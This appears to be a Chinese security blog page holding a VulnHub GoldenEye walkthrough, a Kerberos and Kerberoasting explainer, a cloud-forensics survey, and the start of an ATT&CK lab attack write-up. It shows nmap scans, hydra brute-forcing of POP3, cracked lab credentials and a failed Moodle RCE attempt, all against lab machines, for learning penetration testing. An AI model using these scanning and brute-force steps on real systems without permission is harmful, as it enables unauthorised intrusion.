  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/28/VulnHub-GoldenEye/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/28/VulnHub-GoldenEye/" class="post-title-link" itemprop="url">VulnHub-GoldenEye:1 玩耍记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-28 16:50:10" itemprop="dateCreated datePublished" datetime="2021-05-28T16:50:10+08:00">2021-05-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-01 11:31:54" itemprop="dateModified" datetime="2021-07-01T11:31:54+08:00">2021-07-01</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>定个小目标，把50台vulhub玩一遍，探探其中奥秘。当然最终目标是获取root权限或者admin账号密码。本靶场目标是获取root目录下flag.txt文件。</p>
<h1 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h1><p>靶机：GoldenEye 192.168.140.133</p>
<p>攻击机：kali 192.168.140.128</p>
<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><p>首先需要找到攻击目标,nmap -sP 192.168.140.0/24</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/1.png"></p>
<p>找到IP地址之后去探测目标机子上开了哪些服务和端口 nmap -sV -vv -p 1-65535 192.168.140.133</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/2.png"></p>
<p>可以看到共开放了4个端口，熟悉的80端口web服务，先打开试试看，发现不可以访问。这可是第一次遇到这种问题。nmap既然可以扫描到靶机，说明攻击机和靶机之间可以ping通，再试试宿主机ping虚拟机，发现不可以，查询ip之后，发现宿主机和虚拟机并不在同一个网段上，那就改了来</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/3.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/4.png"></p>
<p>如此就可以ping通了，成功访问web服务，同时也解决掉了之前MobaXterm的疑惑</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/5.png"></p>
<p>看到此图的提示，进入/sev-home/目录中，发现登陆框，一定是要找相关用户名和密码。回到刚才的首页，F12看到下面引用terminal.js。通过报错信息也可看到中间件为apache</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/6.png"></p>
<p>访问terminal.js看到以下信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/7.png"></p>
<p>用burp的decoder模块解密密码，登陆成功，此处用户名一定是小写。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/8.png"></p>
<blockquote>
<p>加密格式总结：</p>
<ul>
<li>Unicode：\u开头</li>
<li>UTF8/URL：%开头</li>
<li>UTF16：\x开头</li>
<li>&amp;#73;：　73为ASCII码，对应I</li>
</ul>
</blockquote>
<p>登录之后，发现靶机开了pop3服务，且开在某个较高端口上。已知pop3服务为55007，既然知道pop3，也就是说可以从邮件服务器上读取邮件，接下来就是找用户名和密码。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/9.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/10.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/19.png"></p>
<p>在terminal.js文件中，有注释写道，make sure you update your default password(建议改成make sure to update your passwd),也就是说目前是默认密码。用户名为boris,此处密码暴力破解即可，一般默认密码都比较简单。</p>
<p>hydra -L 1.txt -P /usr/share/wordlists/fasttrack.txt  192.168.140.133 -s 55007 pop3</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/11.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/12.png"></p>
<p>密码为 secret1!</p>
<p>通过nc实现telnet连接pop3，登陆并查看boris的邮件信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/13.png"></p>
<p>其中三封邮件内容如下，</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/14.png"></p>
<p>root发给boris的邮件，表明admin并不会扫描boris用户所发的任何邮件</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/15.png"></p>
<p>natalya发给boris的邮件，说自己破了boris的密码</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/16.png"></p>
<p>alec发给boris的邮件，注明此附件是goldeneye的部分最终访问代码，让boris把附件放到root文件夹下的隐藏目录。最终执行需要所有的访问代码。执行计划的最后一步是Xenia获取网站的权限并熟悉Goldeneye终端代码.</p>
<p>再查看natalya的邮件有什么信息。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/17.png"></p>
<p>root让natalya不要再破坏boris的代码</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/18.png"></p>
<p>得到用户名密码，此服务器域名和网址，且在/etc/hosts可添加信息</p>
<p>username: xenia<br>password: RCP90rulez!</p>
<p>Domain: severnaya-station.com/gnocertdir</p>
<p>point this servers IP to severnaya-station.com in /etc/hosts.</p>
<p>打开本机/etc/hosts。添加域信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/20.png"></p>
<p>登陆网站看到登陆框，此处是一个开源的CMS系统–moodle，用刚才得到的用户名和密码登陆即可</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/21.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/22.png"></p>
<p>找到一封相关的邮件，邮件中标注doak的用户名：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/23.png"></p>
<p>知道用户名继续用hydra爆破，然后登陆邮件服务器：</p>
<p>此处因为实习原因，电脑更换，内网IP有所差，但实验内容不变。IP变为如下内容：</p>
<p>靶机：GoldenEye 192.168.221.128</p>
<p>攻击机：kali 192.168.221.130</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/24.png"></p>
<p>得到doak的CMS的账户密码：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/25.png"></p>
<p>登陆CMS发现在doak隐私文件目录下for james文件下有一个txt文本，文本内容如下所示：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/26.png"></p>
<p>找到一个jpg文件位于以下位置：</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/27.png"></p>
<p>使用wget下载到本地，并用strings或exiftool检查图片内容，发现Image Description字段为可疑base64</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import base64;s&#x3D;base64.&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/28/VulnHub-GoldenEye/28.png"></p>
<p>解码后为xWinter1995x!。到此得到管理员的账号密码，所有人信息一览无余</p>
<p>账号：admin</p>
<p>密码：xWinter1995x!</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/29.png"></p>
<h1 id="0x03-漏洞探测及利用"><a href="#0x03-漏洞探测及利用" class="headerlink" title="0x03 漏洞探测及利用"></a>0x03 漏洞探测及利用</h1><p>从上面内容已知Moodle版本为2.2.3。存在远程命令执行漏洞CVE-2013-3630，msf中存在此payload，不过打不通。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/30.png"></p>
<p>可以发现此课程管理系统存在可上传文件和上传系统路径的地方，发现可以插入shell命令的地方。</p>
<p>path to aspell并无出现在moodle的选项里，moodle的选项只包括google 和pspell，所以可能无法利用</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/32.png"></p>
<blockquote>
<p>du:Path to du. Probably something like /usr/bin/du. If you enter this, pages that display directory contents will run much faster for directories with a lot of files.</p>
<p>aspell:拼写检查器。To use spell-checking within the editor, you MUST have aspell 0.50 or later installed on your server, and you must specify the correct path to access the aspell binary. On Unix/Linux systems, this path is usually /usr/bin/aspell, but it might be something else.</p>
<p>dot:Path to dot. Probably something like /usr/bin/dot. To be able to generate graphics from DOT files, you must have installed the dot executable and point to it here. Note that, for now, this only used by the profiling features (Development-&gt;Profiling) built into Moodle.</p>
</blockquote>
<h1 id="0x04-复盘"><a href="#0x04-复盘" class="headerlink" title="0x04 复盘"></a>0x04 复盘</h1><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></li>
<li>nc实现telnet连接pop3：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LL458524906/article/details/74635272">https://blog.csdn.net/LL458524906/article/details/74635272</a></li>
<li>aspell参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1764068">https://cloud.tencent.com/developer/article/1764068</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/" class="post-title-link" itemprop="url">域渗透前言之kerberos协议</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-05-25 09:51:20 / 修改时间：14:34:27" itemprop="dateCreated datePublished" datetime="2021-05-25T09:51:20+08:00">2021-05-25</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-Kerberos简介"><a href="#0x01-Kerberos简介" class="headerlink" title="0x01 Kerberos简介"></a>0x01 Kerberos简介</h1><p>Kerberos认证中，最主要的问题是如何证明“你是你”的问题，当一个Client去访问Server上的某服务时，Server如何判断Client是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截/篡改也不影响通讯的安全性，这正是Kerberos解决的问题。在域渗透过程中Kerberos协议的攻防也至关重要。</p>
<h2 id="1-Kerberos协议框架"><a href="#1-Kerberos协议框架" class="headerlink" title="1.Kerberos协议框架"></a>1.<strong>Kerberos协议框架</strong></h2><p>在Kerberos协议中主要是有三个角色的存在：</p>
<ul>
<li><p>访问服务的Client</p>
</li>
<li><p>提供服务的Server</p>
</li>
<li><p>KDC（Key Distribution Center）密钥分发中心</p>
<p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/1.jpg"></p>
</li>
</ul>
<p>如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是车站的认证系统。如果Client端的票据是合法的（由你本人身份证购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票只有一张。</p>
<p>由上图中可以看到<strong>KDC又分为两个部分</strong>：</p>
<p><strong>Authentication Server</strong>： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张<strong>TGT</strong>（Ticket Granting Ticket）票给Client。</p>
<p><strong>Ticket Granting Server</strong>： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（ServiceTicket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/2.jpg"></p>
<p>KDC服务框架中包含一个<strong>KRBTGT</strong>账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号，在发送票据的时候会使用到他的密码hash。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/3.jpg"></p>
<h2 id="2-Kerberos认证-ticket-system"><a href="#2-Kerberos认证-ticket-system" class="headerlink" title="2. Kerberos认证-ticket system"></a>2. Kerberos认证-ticket system</h2><p>流程当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，然后通过AS发放的TGT向Server发起认证请求，这个过程分为三块：</p>
<p><strong>The Authentication Service Exchange</strong>：Client与AS的交互</p>
<p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client与TGS的交互</p>
<p><strong>The Client/Server Authentication Exchange</strong>：Client与Server的交互</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/4.jpg"></p>
<p><strong>(1)TheAuthentication Service Exchange</strong></p>
<p>KRB_AS_REQ</p>
<p>Client-&gt;AS：发送 Authenticator1(Client 密码加密 TimeStamp)</p>
<p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client 密码 Hash 加密的时间戳、ClientID、网络地址、加密类型等内容。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/5.jpg"></p>
<p>KRB_AS_REP</p>
<p>AS-&gt; Client：发送 Client 密码加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
<p>在 KDC 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 HASH 加密的 sessionkey-as 和 TGT（由 KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp 等信息）。</p>
<p><strong>(2)TheTicket-Granting Service (TGS) Exchange</strong></p>
<p>KRB_TGS_REQ</p>
<p>Client -&gt;TGS 发送 Authenticator2 (sessionkey-as 加密 TimeStamp) 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p>
<p>Client 接收到了加密后的 Sessionkey-as 和 TGT 之后，用自身密码解密得到 Sessionkey-as，TGT 是由 KDC 密码加密，Client 无法解密。这时 Client 再用 Sessionkey-as 加密 TimeStamp 和 TGT 一起发送给 KDC 中的 TGS（TicketGranting Server）票据授权服务器换取能够访问 Server 的票据。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/6.jpg"></p>
<p>KRB_TGS_REP</p>
<p>TGS-&gt; Client 发送 密文 1(sessionkey-as 加密 sessionkey-tgs) 和 票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p>
<p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p>
<p><strong>(3)TheClient/Server Authentication Exchange</strong></p>
<p>KRB_AP_REQ</p>
<p>Client -&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 TimeStamp) 和票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p>
<p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 sessionkey-tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 TimeStamp 和 ST 一起发送给 Server。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/7.jpg"></p>
<h1 id="0x02-Kerberoasting-对kerberos的渗透"><a href="#0x02-Kerberoasting-对kerberos的渗透" class="headerlink" title="0x02 Kerberoasting-对kerberos的渗透"></a>0x02 Kerberoasting-对kerberos的渗透</h1><p>在整个渗透的过程当中，KDC密钥分发中心是我们渗透的重点，因为KDC存储了域中所有用户的密码哈希。    </p>
<p>介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。</p>
<p>下图为设置 Kerberos 的加密方式，在域中可以在域控的「本地安全策略」中进行设置：</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/17.jpg"></p>
<p>设置RC4 方式加密。</p>
<p><img src="/2021/05/25/%E5%9F%9F%E6%B8%97%E9%80%8F-kerberos/18.jpg"></p>
<p>设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。</p>
<h1 id="0x0-参考"><a href="#0x0-参考" class="headerlink" title="0x0 参考"></a>0x0 参考</h1><p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/196434.html">https://www.freebuf.com/articles/system/196434.html</a></p>
<p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN.html">https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-SPN.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.notion.so/e977d98f5bd740db87ac4e5cae38a442#57ac8897745f4a05a570415401ee7d5f">https://www.notion.so/e977d98f5bd740db87ac4e5cae38a442#57ac8897745f4a05a570415401ee7d5f</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/" class="post-title-link" itemprop="url">云计算取证综述</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-05-22 16:55:05 / 修改时间：20:04:59" itemprop="dateCreated datePublished" datetime="2021-05-22T16:55:05+08:00">2021-05-22</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>834</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于目前所做项目及论文的原因(具体不便细说)，需要调研云取证，刚好在此做一总结。本篇文章主要是对云环境中电子数据的分析技术作以总结。</p>
<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>Ruan K教授从技术、组织和法律三个维度划分云取证领域相关问题。</p>
<ul>
<li>技术维度：云计算环境中进行电子数据取证的具体过程和试用的技术和工具。</li>
<li>组织维度：云计算环境中包含的角色，包括云服务提供商、云服务用户、云服务中介、审计人员和取证人员，不同的角色在云取证活动中的职责不同，他们之间的交互可以促进云取证的实施。法律维度主要关注在涉及跨多个管辖区的法律问题。</li>
</ul>
<p>云计算在电子取证领域的领域包括定位电子数据所在虚拟机的物理位置、设计云取证模型等。设计云取证模型是当前云取证研究的主要方向之一，对于云取证工作具有重要的指导意义。本文主要研究云中电子数据的分析技术。</p>
<h1 id="0x02-云计算-Cloud-Computing"><a href="#0x02-云计算-Cloud-Computing" class="headerlink" title="0x02 云计算(Cloud Computing)"></a>0x02 云计算(Cloud Computing)</h1><p>云计算可以看作是并行计算、分布式计算和网格计算等计算机技术和网络技术的融合和发展。简单来说，云计算是通过网<br>络将庞大的计算处理程序自动分拆成无数个较小的子程序，再交由多部服务器所组成的庞大系统，经搜寻、计算、分析之后将<br>处理结果回传给用户。使用这项技术，网络服务提供者可以在数秒之内，达成处理数以千万计甚至亿计的信息，达到和超级计算<br>机同样强大效能的网络服务。  </p>
<h1 id="0x03-云环境中电子数据的分析技术研究"><a href="#0x03-云环境中电子数据的分析技术研究" class="headerlink" title="0x03 云环境中电子数据的分析技术研究"></a>0x03 云环境中电子数据的分析技术研究</h1><p>云环境下的电子数据分析：<strong>取证调查人员借助工具、算法对涉案的电子数据进行分析</strong>的过程。主要包括</p>
<ul>
<li>数据源分析</li>
<li>数据恢复</li>
<li>事件重构</li>
<li>数据检索</li>
</ul>
<p>云环境中的电子数据量大、数据格式多、多源证据时间戳不一致、网络环境复杂等特性为分析证据带来极大的挑战。</p>
<ol>
<li><p>数据量巨大：目前的研究思路已经从<strong>分析所有数据的取证</strong>转变为<strong>用机器学习分析取证</strong>；</p>
</li>
<li><p>数据源分析困难：借助SDN网络取证分析来实现网络攻击溯源；</p>
</li>
</ol>
<p>然而目前提出的方法均存在局限性，无法有效解决目前的困境。云环境中电子数据的分析方法臻待进一步研究。</p>
<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><ol>
<li><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/11419">https://www.secrss.com/articles/11419</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/14/PenetrationRange/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/14/PenetrationRange/" class="post-title-link" itemprop="url">ATK&CK实战靶场搭建及攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-14 20:00:13" itemprop="dateCreated datePublished" datetime="2021-05-14T20:00:13+08:00">2021-05-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-26 10:25:48" itemprop="dateModified" datetime="2021-05-26T10:25:48+08:00">2021-05-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h1><p>说实话对于搭建window内外网IP之前没试过，觉得也很简单，结果把内网网络适配器和外网的网络适配器搞反了，导致时间耗费较高，特此记录。其他的博客大抵都跳过了此步骤。</p>
<p>下载靶场环境：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
<p>大家的模拟攻击示意图很清楚，在此借鉴一下：</p>
<p><img src="/2021/05/14/PenetrationRange/4.png"></p>
<p>靶机环境拓扑图如下：<br><img src="/2021/05/14/PenetrationRange/2.png"></p>
<p>配置网络：</p>
<p>分别给web服务器配置NAT模式的网卡一个作为外网，VMnet2的网卡一个作为内网。其余域控和域成员分配一个VMnet2即可。在vmware的虚拟网络配置器里面需要添加VMnet2，且设置NAT模式取消DHCP自动分配IP选项。</p>
<p>win7开机后，需要设置本地连接6的IPV4如下图所示：</p>
<p>控制面板 - 网络和Internet - 网络和共享中心 - 更改适配器设置 - 右键本地连接6 - 双击IPv4，其中<strong>114.114.114.114</strong>是国内三大运营商的通用DNS，是国内用户上网常用的DNS</p>
<p><strong>8.8.8.8</strong>和<strong>8.8</strong>.<strong>4.4</strong> 是Google提供的免费DNS服务器的IP，更适合国外以及访问国外网站的用户使用</p>
<p><img src="/2021/05/14/PenetrationRange/3.png"></p>
<p>参考下图:<br><img src="/2021/05/14/PenetrationRange/1.png"></p>
<p>开启win7的phpstudy,同时测试win7是否可以pingkali和内网的两台主机。ping通over，环境搭建到此结束。</p>
<h1 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2. 攻击流程"></a>2. 攻击流程</h1><h2 id="0x01-主机发现"><a href="#0x01-主机发现" class="headerlink" title="0x01 主机发现"></a>0x01 主机发现</h2><p>DMZ区也就是处于两个防火墙之间的，一个合格的DMZ区是为了提供外部主机访问内网资源服务器的一个缓冲区域，应该有着严格的内外网隔离，本次靶场只是一个模拟，dmz区并没有很合规。</p>
<p>那么入手以后，先进行信息收集，桥接嘛，那么直接扫一下桥接网段的存活主机</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.140.0/24</span><br><span class="line"></span><br><span class="line">netdiscover -i eth0 -r 192.168.140.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/14/PenetrationRange/5.png"></p>
<p>获得目标IP，开始扫描端口：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> -vv提高输出信息的详细度</span></span><br><span class="line">nmap -sV -vv -p 1-65535 192.168.140.130</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/14/PenetrationRange/6.png"></p>
<p><img src="/2021/05/14/PenetrationRange/7.png"></p>
<p>80端口是一个phpstudy探针：</p>
<p><img src="/2021/05/14/PenetrationRange/8.png"></p>
<p>最下方有数据库登陆框测试mysql连同，尝试root/root即可登陆。初步getshell思路就是通过mysql拿shell。</p>
<p><img src="/2021/05/14/PenetrationRange/9.png"></p>
<p>目录扫描还是御剑靠谱一点，扫出beifen.rar。</p>
<p><img src="/2021/05/14/PenetrationRange/10.png"></p>
<p>备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.102/yxcms</code>进入网站首页</p>
